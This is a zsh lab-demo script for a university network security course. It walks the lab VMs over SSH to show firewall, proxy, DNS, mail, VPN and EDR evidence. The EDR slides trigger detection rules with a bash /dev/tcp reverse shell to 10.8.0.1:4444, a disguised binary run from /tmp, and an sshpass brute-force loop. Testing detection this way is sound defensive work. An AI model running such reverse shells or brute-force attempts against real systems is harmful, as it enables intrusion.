#!/bin/zsh
# =============================================================================
# lab-view.zsh  —  LOCAL orchestrator (activity-aware)
# -----------------------------------------------------------------------------
# Runs entirely on your machine. Prompts for an ACTIVITY (1 / 2.1 / 2.2 / 3 /
# 4.1 / 4.2), then for that activity:
#   * shows "Activity <x> — <name>" on the title screen
#   * draws the per-activity network map (network_map.py picks it by activity)
#   * walks the relevant hosts, showing activity-specific config/tests
#   * runs the matching automarker:  automark_activity<x>_ipv6.sh  on each VM
#   * runs the IPv6 verification block
#
# Usage:   ./lab-view.zsh [activity]        e.g.  ./lab-view.zsh 2.2
#          (omit the arg to be prompted)
#
# Only the automarker needs to live on the remotes (installed by your deploy
# script). Everything else is gathered over SSH and rendered locally.
# =============================================================================

setopt pipefail
zmodload zsh/terminfo 2>/dev/null
autoload -U colors && colors

# ---- Hosts (your ssh aliases) ----------------------------------------------
ALL_HOSTS=(rgw egw igw srv dkt ovc)

typeset -A NAME
NAME=( rgw "Remote Gateway"  egw "External Gateway"  igw "Internal Gateway"
       srv "Ubuntu Server"   dkt "Ubuntu Desktop"    ovc "OpenVPN Client" )
# ovc = the 5th VM introduced in Activity 4.2 (OpenVPN client on the external
# network). It is only walked for 4.2 — you need an `ssh ovc` alias to it.

typeset -A IS_GATEWAY IS_WG IS_DESKTOP WSTUNNEL
IS_GATEWAY=( rgw 1  egw 1  igw 1  srv 0  dkt 0 )
IS_WG=(      rgw 1  egw 1  igw 0  srv 0  dkt 0 )
IS_DESKTOP=( rgw 0  egw 0  igw 0  srv 0  dkt 1 )
WSTUNNEL=(   rgw wstunnel-server  egw wstunnel-client )

# ---- Lab DNS / mail domain (used by the DNS + Mail activity demos) ----------
# Real split-horizon zone: public records at the registrar (Namecheap), the
# internal view served by BIND9 on the Internal Gateway (igw). Demos query
# www.<domain>, mail.<domain> and the zone file /etc/bind/zones/db.<domain>.
LAB_DOMAIN="3014ict.chris.grul.me"

# ---- Activity metadata ------------------------------------------------------
VALID_ACTS=(1 2.1 2.2 3 4.1 4.2 5)

typeset -A ACT_NAME
ACT_NAME=(
  1   "DMZ Networks"
  2.1 "Secure Web Server (NAT, SSL, Proxy)"
  2.2 "DNS Server (BIND9)"
  3   "Email Server (Postfix + Dovecot)"
  4.1 "Firewalls (nftables)"
  4.2 "VPN (OpenVPN)"
  5   "Endpoint Detection & Response (Rustinel EDR)"
)

# Which hosts to walk per activity (trim/expand to suit your time limit).
typeset -A ACT_HOSTS
ACT_HOSTS=(
  1   "rgw egw igw srv dkt"
  2.1 "egw srv igw dkt"
  2.2 "igw srv dkt"
  3   "srv igw dkt"
  4.1 "egw rgw srv"
  4.2 "igw egw ovc"
  5   "ovc"
)

# ---- Automarker location on each remote ------------------------------------
# deploy-lab-view.zsh clones the repo to ~user/3014ICT (for staff to inspect /
# git-log) and installs root-owned copies of the automarkers into AUTOMARK_DIR.
# Passwordless sudo is granted ONLY on these fixed, non-user-writable paths, so
# the script that runs as root cannot be modified by the login user. Verify
# provenance by diffing an installed copy against the checkout:
#   diff <(sudo cat AUTOMARK_DIR/automark_activityX_ipv6.sh) \
#        ~/3014ICT/'Assessment 1'/activityX/automark_activityX_ipv6.sh
AUTOMARK_DIR="/usr/local/sbin"
remote_automark() { print -r -- "${AUTOMARK_DIR}/automark_activity${ACTIVITY}_ipv6.sh" }

# Per-host SSH login user (rgw's NOPASSWD rights were granted to 'user').
typeset -A LOGIN_USER
LOGIN_USER=( rgw user )

# ---- SSH transport (connection multiplexing) -------------------------------
SSH_OPTS=(-o ControlMaster=auto
          -o "ControlPath=$HOME/.ssh/cm-%r@%h:%p"
          -o ControlPersist=60s)

target() { if [[ -n "${LOGIN_USER[$1]}" ]]; then print -r -- "${LOGIN_USER[$1]}@$1"; else print -r -- "$1"; fi }
run()    { ssh "${SSH_OPTS[@]}" "$(target "$1")" "$2" }
close_masters() { for H in "${ALL_HOSTS[@]}"; do ssh "${SSH_OPTS[@]}" -O exit "$(target "$H")" 2>/dev/null; done }
trap close_masters EXIT

# ---- Local syntax highlighting ---------------------------------------------
LEXER_FILE="${0:A:h}/lab_lexers.py"
hl() {
    local content="$1" lexer="${2:-text}" out
    if [[ -r $LEXER_FILE ]] && command -v python3 >/dev/null 2>&1; then
        out=$(print -r -- "$content" | python3 "$LEXER_FILE" "$lexer" 2>/dev/null)
        if (( $? == 0 )) && [[ -n $out ]]; then print -r -- "$out"; return; fi
    fi
    print -r -- "$content"
}

# =============================================================================
# Presentation helpers  (unchanged — local display only)
# =============================================================================
read -r -d '' ASCII_ART << 'EOF'
#                  #
                                ##                 #
                                ##                ##
                                ###              ###
                    #           ####            ####           #
                    ###         #####          +####         ###
                    #####       ######         #####       #####
                    #######     ######        ######      ######
                    #######     #######      #######      ######
                    #######     ########    ########      ######
         ######     #######     ########    ########      ######     ######
         ######     #######     ########    ########      ######     ######
         ######     #######     ########    ########      ######     ######
         ######     #######     ########    ########      ######     ######
         ######     #######     ########    ########      ######     ######
         ######     #######     ########    ########      ######     ######
         ######     #######      #######    #######       ######     ######
         ######     #######       ######    ######       #######     ######
         ######     ########       #####    ######      ########     ######
         ######     #########      #####    #####      #########     ######
         ######       #########     ####    ####      ########       ######
         ######          #######     ###    ###     #######          ######
         ######             #####     ##    ###    ######            ######
         ##########           #####   ##    ##    ####           ##########
         ###############         ###   #    #   ###          ##############
         ####################       #          #        ###################
         ########################                  ########################




           #######  #########  ##  ####### ######## ##  ######### ##     ##
          ##    ### ###     ## ##  ##      ##       ##     ##     ##     ##
         ##         ###     ## ##  ##      ##       ##     ##     ##     ##
         ##   ##### ########   ##  ####### #######  ##     ##     #########
         ##      ## ###  ##    ##  ##      ##       ##     ##     ##     ##
          ##    ### ###   ##   ##  ##      ##       ##     ##     ##     ##
           ##### ## ###    ##  ##  ##      ##       ##     ##     ##     ##

###     ### ###    ##  ##  ##      ## ######## #########   #######  ## ###########     ##
###     ### ####   ##  ##  ##      ## ###      ###     ## ##     ## ##    ##    ##    ##
###     ### ####   ##  ##   ##    ##  ###      ###     ## ##     ## ##    ##     ##  ##
###     ### ## ### ##  ##   ##    ##  #######  #########   #####    ##    ##      ####
###     ### ##  #####  ##    ##  ##   ###      ###  ##          ### ##    ##       ##
 ###   ###  ##    ###  ##    #####    ###      ###   ##   ###    ## ##    ##       ##
  ######    ##     ##  ##     ###     ######## ###    ##   #######  ##    ##       ##
EOF

typeset -gi ART_WIDTH=89
typeset -ga processed_lines
first_line_padding="$(printf '%*s' 32 "")"
processed_lines=( "${(@f)ASCII_ART}" )
processed_lines[1]="${first_line_padding}${processed_lines[1]}"
for i in {1..${#processed_lines[@]}}; do
    line="${processed_lines[$i]}"
    if (( ${#line} < ART_WIDTH )); then
        processed_lines[$i]="${line}$(printf '%*s' $(( ART_WIDTH - ${#line} )) "")"
    fi
done

typeset -gi COLS=80 ROWS=24
_isnum() { [[ $1 == <-> ]] && (( $1 > 0 )); }
refresh_dims() {
    local size cols rows
    if size=$(stty size </dev/tty 2>/dev/null); then rows=${size%% *}; cols=${size##* }; fi
    _isnum "$cols" || cols=${COLUMNS:-0}
    _isnum "$cols" || cols=$(tput cols 2>/dev/null)
    _isnum "$cols" || cols=80
    _isnum "$rows" || rows=${LINES:-0}
    _isnum "$rows" || rows=$(tput lines 2>/dev/null)
    _isnum "$rows" || rows=24
    COLS=$cols; ROWS=$rows
}

print_blank_bg_line() { print -P "%K{160}$(printf '%*s' "$COLS" "")%k" }
print_centered_line() {
    local text="$1" is_bold="$2" fg_color="${3:-white}" bg_color="${4:-027}"
    local total_pad=$(( COLS - ${#text} )); (( total_pad < 0 )) && total_pad=0
    local left_pad=$(( total_pad / 2 )) right_pad=$(( total_pad - total_pad / 2 ))
    local left_spaces right_spaces
    left_spaces=$(printf '%*s' "$left_pad" ""); right_spaces=$(printf '%*s' "$right_pad" "")
    if [[ "$is_bold" == "true" ]]; then
        print -P "%K{${bg_color}}%F{${fg_color}}${left_spaces}%B${text}%b${right_spaces}%k%f"
    else
        print -P "%K{${bg_color}}%F{${fg_color}}${left_spaces}${text}${right_spaces}%k%f"
    fi
}
print_title() {
    refresh_dims
    local fg_color="${3:-white}" bg_color="${4:-027}"
    if [[ ! -t 1 ]]; then print -- "------------------------------------------------------------"; print -- "  $1"; [[ -n "$2" ]] && print -- "  $2"; return; fi
    local separator; separator=$(printf '%.0s-' {1..$COLS})
    print_centered_line "$separator" "false" "$fg_color" "$bg_color"
    print_centered_line "$1"         "true"  "$fg_color" "$bg_color"
    print_centered_line "$2"         "false" "$fg_color" "$bg_color"
    print_centered_line "$separator" "false" "$fg_color" "$bg_color"
}
print_welcome() {
    refresh_dims
    if [[ ! -t 1 ]]; then print -- "=== $1 ==="; [[ -n "$2" ]] && print -- "    $2"; return; fi
    if (( COLS < ART_WIDTH )); then
        clear; print -P "%F{202}(Widen the window to >= ${ART_WIDTH} cols for the full banner.)%f"
        print_title "$1" "$2" "white" "160"; return
    fi
    local ascii_lines_count=${#processed_lines[@]}
    local total_vertical_space=$(( ROWS - ascii_lines_count - 6 )); (( total_vertical_space < 0 )) && total_vertical_space=0
    local top_padding=$(( total_vertical_space / 2 )) bottom_padding=$(( total_vertical_space - total_vertical_space / 2 ))
    clear
    if (( top_padding > 0 )); then for i in {1..$top_padding}; do print_blank_bg_line; done; fi
    for line in "${processed_lines[@]}"; do print_centered_line "$line" "false" "white" "160"; done
    for i in {1..2}; do print_blank_bg_line; done
    print_title "$1" "$2" "white" "160"
    if (( bottom_padding > 0 )); then for i in {1..$bottom_padding}; do print_blank_bg_line; done; fi
}
wait_for_enter() { [[ -t 0 ]] && read -k 1 -s "?"; [[ -t 1 ]] && clear }

NETMAP_FILE="${0:A:h}/network_map.py"
show_network_map() {
    [[ -r $NETMAP_FILE ]] && command -v python3 >/dev/null 2>&1 || return
    clear; refresh_dims
    local map_w=203
    (( COLS < map_w )) && print -P "%F{202}(Map is ${map_w} cols wide — widen the terminal to avoid wrapping.)%f\n"
    python3 "$NETMAP_FILE" "$COLS" "$ROWS" "$ACTIVITY"   # activity picks the map
}
host_banner() { print_title "${NAME[$1]}" "Activity ${ACTIVITY} — ${ACT_NAME[$ACTIVITY]}" "white" "162" }

# =============================================================================
# Per-activity demo slides
#   build_demos <host> fills DEMO_SLIDES with entries: title \t subtitle \t lexer \t command
#   (edit freely — this is where you tailor "what to show" per activity/host)
# =============================================================================
typeset -ga DEMO_SLIDES
slide() { DEMO_SLIDES+=("$1"$'\t'"$2"$'\t'"$3"$'\t'"$4") }

build_demos() {
    DEMO_SLIDES=()
    local H="$1"
    case "$ACTIVITY" in
      # ---- Activity 5: Endpoint Detection & Response (Rustinel EDR on ovc) ---
      #   ovc runs Rustinel (open-source eBPF EDR). Each demo slide self-runs one
      #   safe, reversible attack, then prints the resulting ECS NDJSON alerts via
      #   the pinned `labview-rustinel-alerts` helper (installed NOPASSWD by the
      #   deploy). Reaching ovc at all is over the VPN (df80::1000). See
      #   activity5/README.md and activity5/setup-rustinel.sh.
      5)
        slide "Rustinel EDR — armed (Part A)" "eBPF agent running; Sigma+YARA+IOC enabled; ECS NDJSON alert sink" text "echo -n 'agent  : '; rustinel --version 2>/dev/null | head -1; echo -n 'service: '; systemctl is-active rustinel 2>/dev/null; echo -n 'enabled: '; systemctl is-enabled rustinel 2>/dev/null; echo; echo '== config (scanners + alert sink) =='; { sudo cat /etc/rustinel/config.toml 2>/dev/null || sudo cat /opt/rustinel/config.toml 2>/dev/null; } | grep -E 'enabled|_path|directory|filename' | sed 's/^/  /'"
        slide "Demo 1 — Malware dropped & executed from /tmp (Part B)" "simulate malware written to a world-writable temp dir, made executable and run — Rustinel's process-start detection fires a 'suspicious execution from /tmp' Sigma rule (MITRE T1204/T1059). Safe: the payload is a harmless copy of /bin/true, not real malware." text "echo '== simulate malware dropped into a world-writable temp dir (/tmp) =='; cp /bin/true /tmp/.systemd-worker; chmod +x /tmp/.systemd-worker; echo 'wrote /tmp/.systemd-worker (harmless copy of /bin/true, NOT real malware)'; echo; echo '== execute it — malware routinely runs from /tmp; the process image path is under /tmp =='; /tmp/.systemd-worker && echo 'ran /tmp/.systemd-worker'; sleep 2; echo; echo '== Rustinel alerts =='; sudo /usr/local/sbin/labview-rustinel-alerts 15"
        slide "Demo 2 — Network intrusion: reverse shell (Part C)" "bash reverse shell via /dev/tcp — fires the bundled 'Linux Reverse Shell via /dev/tcp' Sigma rule on process-start (listener optional)" text "timeout 3 bash -c 'bash -i >& /dev/tcp/10.8.0.1/4444 0>&1' 2>/dev/null; echo attempted; sleep 2; echo '== Rustinel alerts =='; sudo /usr/local/sbin/labview-rustinel-alerts 15"
        slide "Demo 3 — SSH brute force (Part D)" "enable sshd password auth for the test -> 20 wrong-password logins to localhost -> custom unix_chkpwd Sigma rule (burst) -> disable password auth again. The alert view is filtered to the brute-force rule only, so the burst fills the log." text "echo '== enable sshd password auth (for the test only) =='; sudo /usr/local/sbin/labview-ssh-passwordauth on; sleep 1; echo; echo '== send 20 wrong-password SSH logins to localhost =='; if command -v sshpass >/dev/null 2>&1; then for i in \$(seq 1 20); do sshpass -p wrong\$i ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=password -o PubkeyAuthentication=no -o ConnectTimeout=3 \$USER@localhost true 2>/dev/null; sleep 0.15; done; echo '20 failed attempts sent'; else echo 'sshpass missing - sudo apt-get install -y sshpass'; fi; sleep 2; echo; echo '== Rustinel alerts (SSH brute-force burst only) =='; sudo /usr/local/sbin/labview-rustinel-alerts 30 | grep -iE 'chkpwd|^TIME|^#'; echo; echo '== disable sshd password auth again (security) =='; sudo /usr/local/sbin/labview-ssh-passwordauth off"
        ;;
      # ---- Activity 1: DMZ Networks — trimmed for time: netplan + IP only ----
      # (WireGuard/wstunnel/sysctl/nftables slides removed; the automarker still
      # runs after these and covers the rest.)
      1)
        if [[ "${IS_DESKTOP[$H]}" == 1 ]]; then
            slide "Netplan configuration" "Interface addressing" yaml "sudo cat /etc/netplan/90*"
        else
            slide "Netplan configuration" "Interface addressing" yaml "sudo cat /etc/netplan/50-cloud-init.yaml"
        fi
        slide "IP Assignment" "Configured addresses and routes" ip "ip a; ip route; ip -6 route"
        ;;
      # ---- Activity 2.1: Secure Web (NAT/SSL/Proxy) -------------------------
      #   ExtGW = nftables NAT+DNAT | Server = Apache | Desktop = client
      #   IntGW = Squid: explicit 8080 + transparent intercept 8081/8443
      #           (ssl-bump peek+bump); internal traffic to 80/443 is DNAT-
      #           redirected into Squid by igw nftables.
      2.1)
        case "$H" in
          egw)
            slide "nftables — NAT & port-forward" "DNAT 80/443 -> 192.168.1.80, masquerade" nft "sudo nft list ruleset"
            slide "Internet + persistence" "egress works; ruleset enabled at boot" text "curl -sSI https://google.com | head -6; echo; sudo systemctl is-enabled nftables"
            ;;
          srv)
            slide "Apache — service + listeners" "active, listening 80/443 (incl. [::])" text "systemctl is-active apache2; echo; sudo ss -tuln | grep -E ':80|:443'"
            slide "Apache over HTTP + HTTPS" "local HTTP redirect + self-signed HTTPS" text "echo '== HTTP =='; curl -sSI http://localhost | head -5; echo '== HTTPS =='; curl -sSIk https://localhost | head -5"
            slide "HTTPS over IPv6" "reach the server on its own v6 address" text "curl -sSIk 'https://[2404:9400:29c1:df10::80]/' | head -6"
            # Challenge item: capture tcp/443 while making an HTTPS request and
            # show the payload is TLS Application Data (ciphertext), NOT readable
            # HTML. Needs a pinned passwordless-sudo grant for tcpdump (deploy).
            slide "TLS on the wire (:443)" "hex dump of tcp/443 — the payload is TLS ciphertext, not readable HTML" text "sudo tcpdump -i any -c 20 -nn -X tcp port 443 > /tmp/lab_cap443.txt 2>/dev/null & sleep 1; curl -sk https://127.0.0.1/ >/dev/null 2>&1; curl -sk https://127.0.0.1/ >/dev/null 2>&1; curl -sk https://127.0.0.1/ >/dev/null 2>&1; curl -sk https://127.0.0.1/ >/dev/null 2>&1; wait; echo '== raw bytes on tcp/443 (hex | ascii) — this is TLS ciphertext, not HTML =='; sed -n '1,40p' /tmp/lab_cap443.txt; printf '\nreadable HTML/HTTP visible on the wire? '; grep -qiE '<html|<title|<body|HTTP/1.1 |GET / HTTP' /tmp/lab_cap443.txt && echo 'YES (unexpected)' || echo 'NO -> only TLS Application Data (ciphertext)'; rm -f /tmp/lab_cap443.txt"
            ;;
          igw)
            slide "Squid — listeners" "explicit 8080 + intercept 8081 / ssl-bump 8443" text "sudo ss -tlnp | grep -E ':8080|:8081|:8443'"
            slide "Squid — access policy" "allow internal_network; deny .au sites during office hours" squidconf "grep -vE '^[[:space:]]*#|^[[:space:]]*\$' /etc/squid/squid.conf"
            slide "Squid — transparent redirect" "igw nftables sends internal 80->8081, 443->8443" nft "sudo nft list table inet nat"
            # Challenge item: the office-hours .au block you just triggered in the
            # browser, straight from Squid's access log (TCP_DENIED/403). Needs a
            # pinned passwordless-sudo grant for tail on the squid log (deploy).
            slide "Squid — office-hours DENIED log" "the .au block you just triggered in the browser (TCP_DENIED/403)" text "sudo tail -n 500 /var/log/squid/access.log 2>/dev/null | grep -E 'TCP_DENIED|DENIED' | tail -20; echo '---'; echo 'Empty above? Drive a .au site in Firefox during 09:00-17:00 to trigger the deny, then re-run this host.'"
            ;;
          dkt)
            slide "Web access via the proxy" "explicit proxy -> DMZ web server (note Squid Via/X-Cache headers)" text "curl -sS -x http://10.10.1.254:8080 -D - -o /dev/null http://192.168.1.80/ | head -12"
            # srv (192.168.1.80 / df10::80) is excluded from the transparent
            # ssl-bump intercept on igw, so the desktop reaches Apache DIRECTLY on
            # both stacks — a bare-IP HTTPS request works (no bump, no SNI needed).
            # The ssl-bump + office-hours .au deny still apply to EXTERNAL traffic
            # (demo that by driving an .au site in the browser, then the igw DENIED
            # log slide) — just not to the DMZ server.
            slide "DMZ web server (direct, IPv4 + IPv6)" "srv bypasses ssl-bump -> Apache direct on both stacks" text "echo '== IPv4 =='; curl -4 -sSik https://192.168.1.80/ | head -10; echo; echo '== IPv6 =='; curl -6 -sSik 'https://[2404:9400:29c1:df10::80]/' | head -10"
            ;;
        esac
        ;;
      # ---- Activity 2.2: DNS (BIND9 on Internal Gateway) --------------------
      2.2)
        case "$H" in
          igw)
            slide "BIND9 — service" "named active + enabled at boot" text "systemctl is-active named; sudo systemctl is-enabled named"
            slide "Zone validation" "named-checkconf + named-checkzone" text "sudo named-checkconf && echo 'checkconf: OK'; sudo named-checkzone ${LAB_DOMAIN} /etc/bind/zones/db.${LAB_DOMAIN} 2>&1 | tail -2"
            slide "Forward + reverse + AAAA" "A / AAAA / PTR, straight from BIND" ip "dig +short @127.0.0.1 www.${LAB_DOMAIN}; dig +short @127.0.0.1 AAAA www.${LAB_DOMAIN}; dig +short @127.0.0.1 -x 192.168.1.80"
            # DNSSEC positive test MUST use a SIGNED zone. google.com is NOT
            # DNSSEC-signed, so a validating resolver marks it "insecure" and
            # (correctly) never sets the ad flag. cloudflare.com is signed, so a
            # successful validation sets ad. dnssec-failed.org is deliberately
            # broken -> SERVFAIL, proving validation is actually enforced.
            slide "Recursion + DNSSEC" "upstream resolve, ad flag on a SIGNED zone, bogus SERVFAIL" ip "dig +short @127.0.0.1 google.com; echo '-- +dnssec on a signed zone (expect ad) --'; dig @127.0.0.1 cloudflare.com +dnssec | grep -E '^;; flags'; echo '-- dnssec-failed.org (expect SERVFAIL) --'; sf=\$(dig @127.0.0.1 dnssec-failed.org | grep 'status:'); echo \"\$sf\"; echo \"\$sf\" | grep -q SERVFAIL && echo '   ✓ correctly rejected (DNSSEC validation enforced)' || echo '   ✗ NOT rejected — DNSSEC not enforced'"
            ;;
          srv|dkt)
            slide "Resolver in use" "queries go to the Internal Gateway" text "resolvectl status 2>/dev/null | grep -iA2 'current dns' || cat /etc/resolv.conf"
            slide "Local domain (A + AAAA)" "resolve www.${LAB_DOMAIN} via 10.10.1.254" ip "dig +short @10.10.1.254 www.${LAB_DOMAIN}; dig +short @10.10.1.254 AAAA www.${LAB_DOMAIN}"
            ;;
        esac
        ;;
      # ---- Activity 3: Mail (Postfix + Dovecot on Ubuntu Server) ------------
      3)
        case "$H" in
          srv)
            slide "Postfix + Dovecot — services" "both active" text "systemctl is-active postfix dovecot"
            slide "Postfix — config" "postconf -n (inet_protocols, virtual)" text "postconf -n"
            slide "Dovecot — config" "doveconf -n (protocols, listen)" text "doveconf -n 2>/dev/null | head -30"
            slide "Mail listeners" "SMTP/IMAP/POP on IPv4 + [::]" text "sudo ss -tuln | grep -E ':25|:143|:993|:110|:995'"
            # Drive this AFTER sending the mail from Thunderbird (desktop-user ->
            # server-user). Shows the message sitting in user2's Maildir: the
            # listing proves it landed, the headers prove sender/recipient, the raw
            # dump shows the real on-disk RFC 5322 message. Reading another user's
            # Maildir needs root -> the deploy pins these exact commands (no wildcards).
            slide "Mail delivered — user2 Maildir" "the email you sent from Thunderbird: desktop-user (user1) -> server-user (user2)" text "echo '== /home/user2/Maildir  (new = just delivered, cur = already opened by a client) =='; sudo ls -la /home/user2/Maildir/new /home/user2/Maildir/cur 2>/dev/null; echo; echo '== key headers — who sent it, to whom =='; sudo find /home/user2/Maildir/new /home/user2/Maildir/cur -type f -exec cat {} + 2>/dev/null | grep -iE '^(From|To|Subject|Date|Return-Path):'; echo; echo '== raw message on disk (headers + body) =='; sudo find /home/user2/Maildir/new /home/user2/Maildir/cur -type f -exec cat {} + 2>/dev/null | sed -n '1,45p'; echo; echo 'Empty above? Send the mail from Thunderbird (desktop-user -> server-user), then re-run this host.'"
            ;;
          igw)
            slide "DNS — MX + AAAA" "mail route + mail.${LAB_DOMAIN}" ip "dig +short @127.0.0.1 ${LAB_DOMAIN} MX; dig +short @127.0.0.1 AAAA mail.${LAB_DOMAIN}"
            ;;
          dkt)
            slide "MX from the client" "resolve mail route via Internal Gateway" ip "dig +short @10.10.1.254 ${LAB_DOMAIN} MX"
            slide "SMTP banner over IPv6" "connect to the mail server on [::]:25" text "python3 -c \"import socket; s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM); s.settimeout(5); s.connect(('2404:9400:29c1:df10::80',25)); print(s.recv(256).decode().strip())\""
            ;;
        esac
        ;;
      # ---- Activity 4.1: Firewalls (nftables on External Gateway) ----------
      4.1)
        case "$H" in
          egw)
            # Part B — the hardened ruleset: default-drop inet filter (7-rule
            # forward), ip nat DNAT (80/443/25) + masquerade/SNAT, plus our merged
            # IPv6 rules (ICMPv6, wg0 forward). A complete listing IS the evidence
            # the file loaded without errors.
            slide "nftables — full ruleset (loaded & active)" "default-drop inet filter + ip nat DNAT/SNAT + merged IPv6/ICMPv6" nft "sudo nft list ruleset"
            # Part D — persistence: enabled + active means the ruleset reloads from
            # /etc/nftables.conf on every boot (is-enabled/is-active need no sudo).
            slide "Firewall persists (Part D)" "nftables.service enabled + active -> ruleset survives reboot" text "echo -n 'enabled: '; systemctl is-enabled nftables; echo -n 'active : '; systemctl is-active nftables"
            # Part C — web forwarded to the DMZ server (DNAT + forward accept).
            slide "Web forwarded to DMZ server (80/443)" "DNAT + forward-accept -> 192.168.1.80 (ping blocked by design)" text "echo '== HTTP =='; curl -sSI http://192.168.1.80 | head -5; echo '== HTTPS =='; curl -sSIk https://192.168.1.80 | head -5"
            # Part C — SMTP forwarded to the mail server. bash /dev/tcp (wrapped so
            # it works regardless of the login shell); no nc dependency, no sudo.
            slide "SMTP forwarded to mail server (25)" "DNAT + forward-accept -> 192.168.1.80:25 (Connection succeeded)" text "timeout 4 bash -c 'echo > /dev/tcp/192.168.1.80/25' && echo 'port 25 reachable through the firewall (192.168.1.80) — Connection succeeded' || echo 'port 25 NOT reachable — check Postfix + forward/DNAT rules'"
            # Part C / Part B — internet still reachable with default-drop active.
            slide "Internet egress (IPv4 + IPv6)" "default-drop forward still permits outbound on both stacks" text "echo '== IPv4 =='; curl -sSI https://google.com | head -4; echo; echo '== IPv6 =='; curl -6 -sSI https://google.com | head -4"
            # Our IPv6 merge in action: ICMPv6 + reaching the DMZ server on its real
            # global v6 address (no NAT — direct to df10::80).
            slide "IPv6 through the firewall" "merged inet rules: ICMPv6 works + DMZ server reachable on its global v6" text "echo '== ping6 the DMZ server =='; ping -6 -c2 -W2 2404:9400:29c1:df10::80 | tail -3; echo; echo '== HTTPS over IPv6 =='; curl -6 -sSIk 'https://[2404:9400:29c1:df10::80]/' | head -3"
            ;;
          rgw)
            slide "nftables — tunnel edge" "IPv6 forward + masquerade to the /56" nft "sudo nft list ruleset"
            # End-to-end IPv6 forward test: rgw -> wg0 tunnel -> egw forward chain ->
            # eth1 -> DMZ server. This genuinely traverses egw's IPv6 forward rules.
            slide "Reach the DMZ server over IPv6 (through egw)" "rgw -> tunnel -> egw forward -> df10::80 web server" text "echo '== ping6 =='; ping -6 -c2 -W2 2404:9400:29c1:df10::80 | tail -3; echo; echo '== HTTPS =='; curl -6 -sSIk 'https://[2404:9400:29c1:df10::80]/' | head -3"
            ;;
          srv)
            # Reaffirm end-to-end deliverability AFTER the hardened firewall is in
            # place. Desktop-user (user1) emails Chris' uni address and CCs
            # server-user (user2); Chris then reply-alls from the uni, CCing
            # server-user again. So BOTH legs land in server-user's Maildir. Show
            # the desktop-user side live in Thunderbird; these two slides show the
            # server-user (user2) copies via the pinned labview-maildir-show helper:
            # most recent = the uni reply (return), before it = the outbound
            # (external). Same user2 Maildir source as Activity 3.
            slide "Return deliverability (server-user, most recent)" "reply-all from the uni CC'd server-user (user2) — inbound through the 4.1 firewall" text "sudo /usr/local/sbin/labview-maildir-show user2 1 2>/dev/null | sed -n '1,45p'"
            slide "External deliverability (server-user, second-most recent)" "the original desktop-user -> uni, CC'd to server-user (user2)" text "sudo /usr/local/sbin/labview-maildir-show user2 2 2>/dev/null | sed -n '1,45p'"
            ;;
        esac
        ;;
      # ---- Activity 4.2: VPN (OpenVPN server on IntGW, client = ovc) --------
      4.2)
        case "$H" in
          igw)
            # Part A — OpenVPN + Easy-RSA installed, vars created
            slide "OpenVPN + Easy-RSA (Part A)" "packages, CA toolkit and vars on the Internal Gateway" text "echo -n 'openvpn : '; openvpn --version 2>/dev/null | head -1; ls ~/openvpn-ca/easyrsa >/dev/null 2>&1 && echo 'easy-rsa: present (~/openvpn-ca)'; ls ~/openvpn-ca/vars >/dev/null 2>&1 && echo 'vars    : present'"
            # Part B — PKI + server certs/keys, built then copied to /etc/openvpn
            slide "PKI + server certificates (Part B)" "CA, server cert/key, DH, TLS-auth — built, then copied into /etc/openvpn" text "echo '== ~/openvpn-ca PKI =='; ls -1 ~/openvpn-ca/pki/ca.crt ~/openvpn-ca/pki/issued/server.crt ~/openvpn-ca/pki/private/server.key ~/openvpn-ca/pki/dh.pem ~/openvpn-ca/ta.key 2>/dev/null; echo; echo '== /etc/openvpn =='; ls -1 /etc/openvpn/ca.crt /etc/openvpn/server.crt /etc/openvpn/server.key /etc/openvpn/dh2048.pem /etc/openvpn/ta.key 2>/dev/null"
            slide "OpenVPN — server.conf (Part B)" "proto/dev, server 10.8.0.0, push route+DNS, tls-auth, cipher" ini "sudo cat /etc/openvpn/server.conf | grep -vE '^[[:space:]]*[#;]|^[[:space:]]*\$'"
            slide "OpenVPN service + tun0 (Part B/F)" "server active + enabled at boot; tun0 = 10.8.0.1" text "echo -n 'active : '; systemctl is-active 'openvpn@server' 2>/dev/null; echo -n 'enabled: '; systemctl is-enabled 'openvpn@server' 2>/dev/null; echo; ip -brief addr show tun0 2>/dev/null || echo 'no tun0'"
            # Part C — client cert + bundle + base.conf remote IP
            slide "Client cert + .ovpn bundle (Part C)" "client1 cert/key, client1.ovpn, base.conf remote = egw eth0" text "ls -1 ~/openvpn-ca/pki/issued/client1.crt ~/openvpn-ca/pki/private/client1.key ~/client-configs/files/client1.ovpn 2>/dev/null; echo; echo -n 'base.conf remote -> '; grep -E '^[[:space:]]*remote ' ~/client-configs/base.conf 2>/dev/null"
            # Part F (server side) — the connected client in the status log
            slide "Connected VPN client (Part F)" "OpenVPN status log shows the client's 10.8.0.x virtual IP" text "sudo cat /var/log/openvpn/openvpn-status.log 2>/dev/null | sed -n '1,20p' || echo '(no status log — connect a client first)'"
            ;;
          egw)
            # Part D — UDP 1194 forward + DNAT + SNAT, added on top of the 4.1 firewall
            slide "nftables — OpenVPN forward/DNAT/SNAT (Part D)" "UDP 1194 -> OpenVPN server on igw (192.168.1.1); 4.1 rules intact" nft "echo '== UDP 1194 rules (forward + DNAT + SNAT) =='; sudo nft list ruleset | grep -E '1194'; echo; echo '== 4.1 web/mail rules still present (regression) =='; sudo nft list ruleset | grep -E 'dport (80|443|25) '"
            ;;
          ovc)
            # This walk connects over the VPN itself: the `ovc` ssh alias resolves
            # to the tunnel-issued address 2404:9400:29c1:df80::1000, so reaching
            # these slides at all already proves the IPv6 tunnel is up.
            # Part E — OpenVPN client installed + config present
            slide "OpenVPN client installed (Part E)" "openvpn + NetworkManager OpenVPN plugin + client1.ovpn present" text "echo -n 'openvpn: '; openvpn --version 2>/dev/null | head -1; dpkg -l 2>/dev/null | grep -q '^ii  network-manager-openvpn ' && echo 'NM OpenVPN plugin: installed'; ls ~/client1.ovpn >/dev/null 2>&1 && echo 'client1.ovpn: present'"
            # Part F — tunnel up (both stacks) + reach across
            slide "VPN tunnel up (Part F)" "tun0 addressed from 10.8.0.0/24 (v4) and df80::/64 (v6 — this host = df80::1000)" text "ip -brief addr show tun0 2>/dev/null || echo 'no tun0 — is the client connected?'; echo; echo -n 'v6 on tun0: '; ip -6 addr show tun0 2>/dev/null | awk '/inet6 .*global/{print \$2}' || echo '(none)'"
